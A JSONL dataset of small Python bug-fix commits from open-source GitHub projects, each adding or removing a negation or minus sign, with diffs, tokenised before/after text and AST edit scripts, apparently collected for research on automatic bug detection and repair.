{"project": "scipy", "commit_sha": "babe19d7adf36b68b3eb6ebc57feb2fd1aca39a3", "parent_sha": "5c5516a72dc41efb8f308f384eb79df57cd87af8", "file_path": "scipy/stats/morestats.py", "project_url": "https://github.com/scipy/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1411,7 +1411,7 @@ def yeojohnson_llf(lmb, data):\n \n     .. math::\n \n-        llf = N/2 \\log(\\hat{\\sigma}^2) + (\\lambda - 1)\n+        llf = -N/2 \\log(\\hat{\\sigma}^2) + (\\lambda - 1)\n               \\sum_i \\text{ sign }(x_i)\\log(|x_i| + 1)\n \n", "before": "math : : llf = N / 2 l og ( h at { s igma } ^ 2 ) + ( l ambda - 1 ) s um_i t ext { sign } ( x_i ) l og ( | x_i | + 1 )", "after": "math : : llf = - N / 2 l og ( h at { s igma } ^ 2 ) + ( l ambda - 1 ) s um_i t ext { sign } ( x_i ) l og ( | x_i | + 1 )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 15, 3, 39], [\"unary_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:N\", 3, 15, 3, 16], 1]]"}
{"project": "Deluge", "commit_sha": "4e1573cb397f23d87c5d27f284dd0229e5553d7f", "parent_sha": "28e36c7edc1672660af29f316a4eb357e47edbae", "file_path": "deluge/ui/console/modes/torrent_actions.py", "project_url": "https://github.com/cas--/Deluge", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -318,7 +318,7 @@ def torrent_actions_popup(mode,tids,details=False, action = None):\n     popup = SelectablePopup(mode,\"Torrent Actions\",torrent_action, (mode, tids))\n     popup.add_line(\"_Pause\",data=ACTION.PAUSE)\n     popup.add_line(\"_Resume\",data=ACTION.RESUME)\n-    if not details:\n+    if details:\n         popup.add_divider()\n         popup.add_line(\"Queue\",data=ACTION.QUEUE)\n     popup.add_divider()\n", "before": "if not details : popup . add_divider ( ) popup . add_line ( \"Queue\" , data = ACTION . QUEUE )", "after": "if details : popup . add_divider ( ) popup . add_line ( \"Queue\" , data = ACTION . QUEUE )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 5, 5, 50], [\"identifier:details\", 3, 12, 3, 19], 1], [\"Delete\", [\"not:not\", 3, 8, 3, 11]], [\"Delete\", [\"not_operator\", 3, 8, 3, 19]]]"}
{"project": "admin4", "commit_sha": "07f7c733979357b8d6e5d42bb6534e4b2f3c451a", "parent_sha": "93f3efaa37f526e224715c3bc240ee66bacecff7", "file_path": "modImap/Mailbox.py", "project_url": "https://github.com/andreas-p/admin4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -364,12 +364,12 @@ class Mailbox(adm.Node):\n           # delete remaining acls\n           ok=c.DelAcl(mailboxPath, user)\n           if not ok:  break\n-        if not ok:\n-          self.SetStatus(\"Save error: %s\" % self.GetServer().GetLastError())\n-          return False\n+      if not ok:\n+        self.SetStatus(\"Save error: %s\" % self.GetServer().GetLastError())\n+        return False\n         \n-        if self.node:\n-          self.parentNode.Refresh()\n+      if not self.node:\n+        self.parentNode.Refresh()\n       return ok\n       \n   @staticmethod\n", "before": "if self . node : self . parentNode . Refresh ( )", "after": "if not self . node : self . parentNode . Refresh ( )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 7, 9, 8, 36], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 7, 12, 7, 21], 1]]"}
{"project": "commcare-wddcp", "commit_sha": "60ebdaf36bb338138ac26845621673a7afe2cbbb", "parent_sha": "9c979b855e8532dd2b48c908c4de6a050b4043af", "file_path": "corehq/form_processor/backends/sql/update_strategy.py", "project_url": "https://github.com/DeckOfPandas/commcare-wddcp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class SqlCaseUpdateStrategy(UpdateStrategy):\n                 self._apply_form_transaction(transaction)\n                 real_transactions.append(transaction)\n \n-        self.case.deleted = bool(real_transactions)\n+        self.case.deleted = not bool(real_transactions)\n \n         rebuild_transaction = CaseTransaction(\n             case=self.case,\n", "before": "self . case . deleted = bool ( real_transactions )", "after": "self . case . deleted = not bool ( real_transactions )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 52], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 29, 3, 52], 1]]"}
{"project": "commcare-wddcp", "commit_sha": "086ab20576a5e58be0c2db1d13cf983d40d4eea0", "parent_sha": "a90c22d6d29a1e261d1ad43bdfdb3be875c0d20b", "file_path": "corehq/apps/tour/tours.py", "project_url": "https://github.com/DeckOfPandas/commcare-wddcp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class StaticGuidedTour(object):\n         }\n \n     def is_enabled(self, user):\n-        return GuidedTour.has_seen_tour(user, self.slug)\n+        return not GuidedTour.has_seen_tour(user, self.slug)\n \n \n NEW_BLANK_APP = StaticGuidedTour(\n", "before": "return GuidedTour . has_seen_tour ( user , self . slug )", "after": "return not GuidedTour . has_seen_tour ( user , self . slug )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 57], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 57], 1]]"}
{"project": "finance_deerlux", "commit_sha": "cb42bb98852fc3b9f57b52402557afa3e3ed9ede", "parent_sha": "e8830a45623b12d3fe8ad1f409567d5eaed48420", "file_path": "crawl_yahoo.py", "project_url": "https://github.com/deerlux/finance_deerlux", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ class YahooCrawler:\n \n         for stock in stocks:\n             start = self.session.query(func.max(StockDayPrice.trading_date)).filter(StockDayPrice.stock_code==stock).scalar()\n-            if not (start is None):\n+            if start is None:\n                 starts.append(start)\n             else:\n                 starts.append(start+datetime.timedelta(1))\n", "before": "if not ( start is None ) : starts . append ( start ) else : starts . append ( start + datetime . timedelta ( 1 ) )", "after": "if start is None : starts . append ( start ) else : starts . append ( start + datetime . timedelta ( 1 ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 13, 6, 59], [\"comparison_operator\", 3, 21, 3, 34], 1], [\"Delete\", [\"not:not\", 3, 16, 3, 19]], [\"Delete\", [\"(:(\", 3, 20, 3, 21]], [\"Delete\", [\"):)\", 3, 34, 3, 35]], [\"Delete\", [\"parenthesized_expression\", 3, 20, 3, 35]], [\"Delete\", [\"not_operator\", 3, 16, 3, 35]]]"}
{"project": "GitGutter", "commit_sha": "bc62f9c094bc71d5151cb0c26c18829d24f72c9f", "parent_sha": "b790e613de2d7ba3f7a19f4b8473dad4c141e836", "file_path": "git_gutter_events.py", "project_url": "https://github.com/webcaetano/GitGutter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ class GitGutterEvents(sublime_plugin.EventListener):\n             ViewCollection.add(view)\n \n     def on_load_async(self, view):\n-        if not self.non_blocking:\n+        if self.non_blocking:\n             ViewCollection.add(view)\n \n", "before": "if not self . non_blocking : ViewCollection . add ( view )", "after": "if self . non_blocking : ViewCollection . add ( view )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 4, 37], [\"attribute\", 3, 16, 3, 33], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 33]]]"}
{"project": "GitGutter", "commit_sha": "060888d5d29be296b844079e10afda2dfb8de125", "parent_sha": "1a9509ecffaaf905864f734a6f595be4474cf0fb", "file_path": "git_gutter_events.py", "project_url": "https://github.com/webcaetano/GitGutter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class GitGutterEvents(sublime_plugin.EventListener):\n             self.debounce(view, \"save\", ViewCollection.add)\n \n     def on_load_async(self, view):\n-        if self.settings_loaded() and self.non_blocking and self.live_mode:\n+        if self.settings_loaded() and self.non_blocking and not self.live_mode:\n             self.debounce(view, \"load\", ViewCollection.add)\n \n     def on_activated_async(self, view):\n", "before": "if self . settings_loaded ( ) and self . non_blocking and self . live_mode : self . debounce ( view , \"load\" , ViewCollection . add )", "after": "if self . settings_loaded ( ) and self . non_blocking and not self . live_mode : self . debounce ( view , \"load\" , ViewCollection . add )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 75], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 61, 3, 75], 1]]"}
{"project": "pyrltools", "commit_sha": "c9c121f96c8f72def7e7e8d3d9e56950ffe1f577", "parent_sha": "b44183d8567b08a8731d31567cd44c436dbf7052", "file_path": "rltools/pyneuralnet.py", "project_url": "https://github.com/gehring/pyrltools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class Logisticfn(object):\n         return fx * (1-fx)\n \n     def evaluatederivderiv(self, x, out=None):\n-        emx = np.exp(-x)\n+        emx = np.exp(x)\n         return emx * (emx-1)/ (emx+1)**3\n \n class Linearfn(object):\n", "before": "emx = np . exp ( - x )", "after": "emx = np . exp ( x )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"argument_list\", 3, 21, 3, 25], [\"identifier:x\", 3, 23, 3, 24], 1], [\"Delete\", [\"-:-\", 3, 22, 3, 23]], [\"Delete\", [\"unary_operator\", 3, 22, 3, 24]]]"}
{"project": "sonic-utilities", "commit_sha": "1d37c9c199b7934653f907095bf11e685889df23", "parent_sha": "bf2788150ace78a1292760e3db403f5d78d182d1", "file_path": "acl_loader/main.py", "project_url": "https://github.com/Azure/sonic-utilities", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -364,7 +364,7 @@ class AclLoader(object):\n             self.configdb.set_entry(self.ACL_RULE, key, self.rules_info[key])\n \n         for key in existing_rules:\n-            if not cmp(self.rules_info[key], self.rules_db_info[key]):\n+            if cmp(self.rules_info[key], self.rules_db_info[key]):\n                 self.configdb.set_entry(self.ACL_RULE, key, None)\n                 self.configdb.set_entry(self.ACL_RULE, key, self.rules_info[key])\n \n", "before": "if not cmp ( self . rules_info [ key ] , self . rules_db_info [ key ] ) : self . configdb . set_entry ( self . ACL_RULE , key , None ) self . configdb . set_entry ( self . ACL_RULE , key , self . rules_info [ key ] )", "after": "if cmp ( self . rules_info [ key ] , self . rules_db_info [ key ] ) : self . configdb . set_entry ( self . ACL_RULE , key , None ) self . configdb . set_entry ( self . ACL_RULE , key , self . rules_info [ key ] )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 13, 5, 82], [\"call\", 3, 20, 3, 70], 1], [\"Delete\", [\"not:not\", 3, 16, 3, 19]], [\"Delete\", [\"not_operator\", 3, 16, 3, 70]]]"}
{"project": "flavio", "commit_sha": "ae455a914b1c4a9df0e90d84b3a9ecafe4e518d7", "parent_sha": "77f1923ac55c37786dcdbb2bdbdd530aa147b179", "file_path": "flavio/physics/mesonmixing/amplitude.py", "project_url": "https://github.com/flav-io/flavio", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def matrixelements(par, meson):\n     me['CVLR'] = -mM*fM**2*(1/6.)*BM(5)*r\n     me['CSLL'] = -mM*fM**2*(5/24.)*BM(2)*r\n     me['CSRR'] = me['CSLL']\n-    me['CTLL'] = -mM*fM**2*(1/2.)*r*(5*BM(2)/3.-2*BM(3)/3.)\n+    me['CTLL'] = mM*fM**2*(1/2.)*r*(5*BM(2)/3.-2*BM(3)/3.)\n     me['CTRR'] = me['CTLL']\n     return me\n \n", "before": "me [ 'CTLL' ] = - mM * fM ** 2 * ( 1 / 2. ) * r * ( 5 * BM ( 2 ) / 3. - 2 * BM ( 3 ) / 3. )", "after": "me [ 'CTLL' ] = mM * fM ** 2 * ( 1 / 2. ) * r * ( 5 * BM ( 2 ) / 3. - 2 * BM ( 3 ) / 3. )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 18, 3, 27], [\"identifier:mM\", 3, 19, 3, 21], 0], [\"Delete\", [\"-:-\", 3, 18, 3, 19]], [\"Delete\", [\"unary_operator\", 3, 18, 3, 21]]]"}
{"project": "rem", "commit_sha": "96c8e1e9fd5d780165a0a0b6e6ebba2cdde6623c", "parent_sha": "1504a89cc2ab0205706dc19333bec05033132f96", "file_path": "rem/callbacks.py", "project_url": "https://github.com/heni/rem", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class CallbackHolder(Unpickable(callbacks=weakref.WeakKeyDictionary,\n         for obj in itertools.chain(self.callbacks.keyrefs(), self.nonpersistent_callbacks.keyrefs()):\n             if isinstance(obj(), ICallbackAcceptor):\n                 if scheduler is not None and scheduler.IsFrozen():\n-                    if allow_defferred:\n+                    if not allow_defferred:\n                         scheduler.WaitUnfreeze()\n                     else:\n                         self.message_queue.StoreMessage(acceptor=obj, event=event, ref=reference or self)\n", "before": "if allow_defferred : scheduler . WaitUnfreeze ( ) else : self . message_queue . StoreMessage ( acceptor = obj , event = event , ref = reference or self )", "after": "if not allow_defferred : scheduler . WaitUnfreeze ( ) else : self . message_queue . StoreMessage ( acceptor = obj , event = event , ref = reference or self )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 21, 6, 106], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:allow_defferred\", 3, 24, 3, 39], 1]]"}
{"project": "ilastik", "commit_sha": "e098da8cbc706dedaeff9e69e3adb105a475dc23", "parent_sha": "d8eb63f647fced621872f0b2c99427f5fc2d0d05", "file_path": "ilastik/shell/gui/startShellGui.py", "project_url": "https://github.com/martinsch/ilastik", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def launchShell(workflowClass=None, *testFuncs, **kwargs):\n \n     # Start the shell GUI.\n     shell.show()\n-    if ilastik.config.cfg.getboolean(\"ilastik\", \"debug\"):\n+    if not ilastik.config.cfg.getboolean(\"ilastik\", \"debug\"):\n         shell.showMaximized()\n \n     # Hide the splash screen\n", "before": "if ilastik . config . cfg . getboolean ( \"ilastik\" , \"debug\" ) : shell . showMaximized ( )", "after": "if not ilastik . config . cfg . getboolean ( \"ilastik\" , \"debug\" ) : shell . showMaximized ( )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 30], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 57], 1]]"}
{"project": "ilastik", "commit_sha": "53e4a59e66a1d62ca7f025e2e0c335e67718dfc7", "parent_sha": "053a1d8d639a68b582b3297a12a7c28383a463c5", "file_path": "ilastik/shell/gui/startShellGui.py", "project_url": "https://github.com/martinsch/ilastik", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def launchShell(workflowClass=None, *testFuncs, **kwargs):\n \n     # Start the shell GUI.\n     shell.show()\n-    if ilastik.config.cfg.getboolean(\"ilastik\", \"debug\"):\n+    if not ilastik.config.cfg.getboolean(\"ilastik\", \"debug\"):\n         shell.showMaximized()\n \n     # Hide the splash screen\n", "before": "if ilastik . config . cfg . getboolean ( \"ilastik\" , \"debug\" ) : shell . showMaximized ( )", "after": "if not ilastik . config . cfg . getboolean ( \"ilastik\" , \"debug\" ) : shell . showMaximized ( )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 30], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 57], 1]]"}
{"project": "PYPOWER-Dynamics", "commit_sha": "65829d8dcf5600387e77032a46eb624a15fdf323", "parent_sha": "ac77f3624ec92cc8145ad2052a531232ec273338", "file_path": "mod_Ybus.py", "project_url": "https://github.com/Hofsmo/PYPOWER-Dynamics", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ def mod_Ybus(Ybus, elements, bus, gen, baseMVA):\n     # Add equivalent load admittance to Ybus matrix\n     Pl, Ql = bus[:, PD], bus[:, QD]\n     for i in range(len(Pl)):\n-        S_load = np.complex(Pl[i],Ql[i]) / baseMVA\n+        S_load = np.complex(Pl[i],-Ql[i]) / baseMVA\n         y_load = S_load / bus[i, VM] ** 2\n         Ybus[i,i] = Ybus[i,i] + y_load\n     \n", "before": "S_load = np . complex ( Pl [ i ] , Ql [ i ] ) / baseMVA", "after": "S_load = np . complex ( Pl [ i ] , - Ql [ i ] ) / baseMVA", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 41], [\"unary_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"subscript\", 3, 35, 3, 40], 1]]"}
{"project": "warp", "commit_sha": "8959ec4c12bbab1a41cc7b91f48e64b19971d092", "parent_sha": "088977f75bec653f7810acb97b3aea1674a8d5c9", "file_path": "warp.py", "project_url": "https://github.com/avivkiss/warp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ def main(remote_host, recursive, file_src, file_dest, tcp_mode, disable_verify,\n   while not controller.is_transfer_finished():\n     time.sleep(0.1)\n \n-  if not controller.is_transfer_success():\n+  if controller.is_transfer_success():\n     logger.debug(\"Done with transfer.\")\n   else:\n     logger.debug(\"Failed to send file.\")\n", "before": "if not controller . is_transfer_success ( ) : logger . debug ( \"Done with transfer.\" ) else : logger . debug ( \"Failed to send file.\" )", "after": "if controller . is_transfer_success ( ) : logger . debug ( \"Done with transfer.\" ) else : logger . debug ( \"Failed to send file.\" )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 3, 6, 41], [\"call\", 3, 10, 3, 42], 1], [\"Delete\", [\"not:not\", 3, 6, 3, 9]], [\"Delete\", [\"not_operator\", 3, 6, 3, 42]]]"}
{"project": "associationmanager", "commit_sha": "07fb7a61bb6ef38e46522f304592f9f58949864d", "parent_sha": "996a2be3881dd0a7521575f3ec670bf106867cdc", "file_path": "events/models.py", "project_url": "https://github.com/michigraber/associationmanager", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -199,7 +199,7 @@ class EventPart(BaseModel):\n         if language == 'de':\n             s =  u'%s : %s' % (self.short_description_de, self.pretty_time())\n         else:\n-            s =  + u'%s : %s' % (self.short_description_en, self.pretty_time())\n+            s =  u'%s : %s' % (self.short_description_en, self.pretty_time())\n         return s\n \n \n", "before": "s = + u'%s : %s' % ( self . short_description_en , self . pretty_time ( ) )", "after": "s = u'%s : %s' % ( self . short_description_en , self . pretty_time ( ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 18, 3, 80], [\"string:u'%s : %s'\", 3, 20, 3, 30], 0], [\"Delete\", [\"+:+\", 3, 18, 3, 19]], [\"Delete\", [\"unary_operator\", 3, 18, 3, 30]]]"}
{"project": "Open-Video-chat", "commit_sha": "854c935bcac9c3182f24e69302eea4f3aae0407f", "parent_sha": "2b68be6d78e25997dd0eb0d2e428909c1eb38090", "file_path": "OpenVideoChat.activity/tube_speak.py", "project_url": "https://github.com/HFOSS-OVC/Open-Video-chat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class TubeSpeak(ExportedGObject):\n         self.tube.watch_participants(self.participant_change_cb)\n \n     def participant_change_cb(self, added, removed):\n-        if self.connected:\n+        if not self.connected:\n             self.tube.add_signal_receiver(self.receive_chat_text_cb,\n                 'send_chat_text', IFACE, path=PATH, sender_keyword='sender')\n             self.connected = True\n", "before": "if self . connected : self . tube . add_signal_receiver ( self . receive_chat_text_cb , 'send_chat_text' , IFACE , path = PATH , sender_keyword = 'sender' ) self . connected = True", "after": "if not self . connected : self . tube . add_signal_receiver ( self . receive_chat_text_cb , 'send_chat_text' , IFACE , path = PATH , sender_keyword = 'sender' ) self . connected = True", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 34], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 26], 1]]"}
{"project": "keras", "commit_sha": "4de120f051cd21ea7b7f11ec72b4606a1577fd4d", "parent_sha": "d9255f15a4db9bb231a039ff963a07fb4625e542", "file_path": "keras/initializers.py", "project_url": "https://github.com/icyblade/keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -458,7 +458,7 @@ def _compute_fans(shape, data_format='channels_last'):\n             fan_in = shape[1] * receptive_field_size\n             fan_out = shape[0] * receptive_field_size\n         elif data_format == 'channels_last':\n-            receptive_field_size = np.prod(shape[:2])\n+            receptive_field_size = np.prod(shape[:-2])\n             fan_in = shape[-2] * receptive_field_size\n             fan_out = shape[-1] * receptive_field_size\n         else:\n", "before": "np . prod ( shape [ : 2 ] )", "after": "np . prod ( shape [ : - 2 ] )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"slice\", 3, 50, 3, 52], [\"unary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:2\", 3, 51, 3, 52], 1]]"}
{"project": "pipe_tasks", "commit_sha": "b1a6c9f1e8939b44bdbeaf7cb5ca14cf92e6ea2e", "parent_sha": "e4814d06b1cfd92f296ac13c9f635ad63cde1784", "file_path": "python/lsst/pipe/tasks/imageDifference.py", "project_url": "https://github.com/frossie-shadow/pipe_tasks", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -321,7 +321,7 @@ class ImageDifferenceTask(pipeBase.CmdLineTask):\n                 kernelSources = self.sourceSelector.selectSources(exposure, selectSources, matches=matches)\n                 random.shuffle(kernelSources, random.random)\n                 controlSources = kernelSources[::self.config.controlStepSize]\n-                kernelSources = [k for i,k in enumerate(kernelSources) if not i % self.config.controlStepSize]\n+                kernelSources = [k for i,k in enumerate(kernelSources) if i % self.config.controlStepSize]\n \n                 self.log.info(\"Selected %d / %d sources for Psf matching (%d for control sample)\" \n                               % (len(kernelSources), len(selectSources), len(controlSources)))\n", "before": "kernelSources = [ k for i , k in enumerate ( kernelSources ) if not i % self . config . controlStepSize ]", "after": "kernelSources = [ k for i , k in enumerate ( kernelSources ) if i % self . config . controlStepSize ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_clause\", 3, 72, 3, 110], [\"binary_operator\", 3, 79, 3, 110], 1], [\"Delete\", [\"not:not\", 3, 75, 3, 78]], [\"Delete\", [\"not_operator\", 3, 75, 3, 110]]]"}
{"project": "runbot", "commit_sha": "3cacd8db52a6f303cb5d2eeb93559dad33da8958", "parent_sha": "f8cbae79e111e52d1b5ced8334eacb2474ccfa84", "file_path": "runbot/models/build.py", "project_url": "https://github.com/odoo/runbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -317,7 +317,7 @@ class runbot_build(models.Model):\n \n         for b in builds:\n             path = os.path.join(build_dir, b)\n-            if b not in actives and os.path.isdir(path) and not os.path.isabs(path):\n+            if b not in actives and os.path.isdir(path) and os.path.isabs(path):\n                 shutil.rmtree(path)\n \n         # cleanup old unused databases\n", "before": "if b not in actives and os . path . isdir ( path ) and not os . path . isabs ( path ) : shutil . rmtree ( path )", "after": "if b not in actives and os . path . isdir ( path ) and os . path . isabs ( path ) : shutil . rmtree ( path )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 16, 3, 84], [\"call\", 3, 65, 3, 84], 2], [\"Delete\", [\"not:not\", 3, 61, 3, 64]], [\"Delete\", [\"not_operator\", 3, 61, 3, 84]]]"}
{"project": "astropy", "commit_sha": "fd444df51cc8593e8abaf0a66905c8db66322c6c", "parent_sha": "7ff12778830f9cf3c157a820b4630a54b171a73e", "file_path": "astropy/units/quantity.py", "project_url": "https://github.com/Juanlu001/astropy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ __all__ = [\"Quantity\"]\n \n \n def _is_unity(value):\n-    return value.bases and value.scale == 1.\n+    return not value.bases and value.scale == 1.\n \n \n def _validate_value(value):\n", "before": "return value . bases and value . scale == 1.", "after": "return not value . bases and value . scale == 1.", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 5, 3, 45], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 12, 3, 45], 1]]"}
{"project": "inasafe", "commit_sha": "6eec385789e365f4bf92bb91411f5d3b7ff67010", "parent_sha": "28133cea5e33327ff118b8175034ac725babe923", "file_path": "safe/report/processors/default.py", "project_url": "https://github.com/lucernae/inasafe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -310,7 +310,7 @@ def qgis_composer_html_renderer(impact_report, component):\n \n     index = composition.numPages()\n     number_of_pages_to_be_removed = 0\n-    while not composition.pageIsEmpty(index):\n+    while composition.pageIsEmpty(index):\n         number_of_pages_to_be_removed += 1\n         index -= 1\n \n", "before": "while not composition . pageIsEmpty ( index ) : number_of_pages_to_be_removed += 1 index -= 1", "after": "while composition . pageIsEmpty ( index ) : number_of_pages_to_be_removed += 1 index -= 1", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"while_statement\", 3, 5, 5, 19], [\"call\", 3, 15, 3, 45], 1], [\"Delete\", [\"not:not\", 3, 11, 3, 14]], [\"Delete\", [\"not_operator\", 3, 11, 3, 45]]]"}
{"project": "PyPagekite", "commit_sha": "bfc74ad797739de29933c7ed3a1c812325270ffb", "parent_sha": "3fd8617cb4dd632e676962f0a3ca836120347754", "file_path": "pagekite.py", "project_url": "https://github.com/zentyal/PyPagekite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3025,7 +3025,7 @@ class PageKite(object):\n       return (((o[0]*256 + o[1])*256 + o[2])*256 + o[3])\n   \n     # Errors on real errors are final.\n-    if ip.endswith(AUTH_ERR_USER_UNKNOWN): return None\n+    if not ip.endswith(AUTH_ERR_USER_UNKNOWN): return None\n \n     # User unknown, fall through to local test.\n     return -1 \n", "before": "if ip . endswith ( AUTH_ERR_USER_UNKNOWN ) : return None", "after": "if not ip . endswith ( AUTH_ERR_USER_UNKNOWN ) : return None", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 3, 55], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 42], 1]]"}
{"project": "python-postmark", "commit_sha": "664b2b199e0c6a4af8bf0c63b3ed66c50377b1cd", "parent_sha": "89be5c4bd2fb9bde84a46f08c814f51538deb5ec", "file_path": "postmark/django_backend.py", "project_url": "https://github.com/themartorana/python-postmark", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -137,7 +137,7 @@ class EmailBackend(BaseEmailBackend):\n                 return False\n         else:\n             pm_messages = list(map(self._build_message, messages))\n-            pm_messages = [m for m in pm_messages if not m]\n+            pm_messages = [m for m in pm_messages if m]\n             if len(pm_messages) == 0:\n                 # If after filtering, there aren't any messages\n                 # to send, bail.\n", "before": "pm_messages = [ m for m in pm_messages if not m ]", "after": "pm_messages = [ m for m in pm_messages if m ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_clause\", 3, 51, 3, 59], [\"identifier:m\", 3, 58, 3, 59], 1], [\"Delete\", [\"not:not\", 3, 54, 3, 57]], [\"Delete\", [\"not_operator\", 3, 54, 3, 59]]]"}
